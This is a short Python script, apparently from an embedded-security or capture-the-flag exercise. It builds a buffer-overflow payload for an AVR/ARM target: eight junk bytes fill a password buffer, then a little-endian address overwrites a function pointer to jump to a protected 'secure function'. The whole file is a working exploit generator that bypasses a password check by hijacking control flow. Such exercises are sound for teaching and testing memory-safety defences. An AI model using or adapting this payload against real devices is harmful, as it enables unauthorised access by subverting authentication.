import struct

# Step 1: Fill the password buffer (8 bytes of junk)
payload = b"A" * 8  

# Step 2: Overwrite function pointer (4 bytes for AVR/ARM)
secure_function_address = 0x08000292  # REPLACE with actual address

# Convert to little-endian format for AVR/ARM
payload += struct.pack("<I", secure_function_address)  # "<I" -> Little-endian 4-byte int

# Step 3: Add extra padding to avoid crashes (optional)
payload += b"\x00" * (32 - len(payload))

# Step 4: Print the payload (as hex)
print("Generated Buffer:", payload.hex())
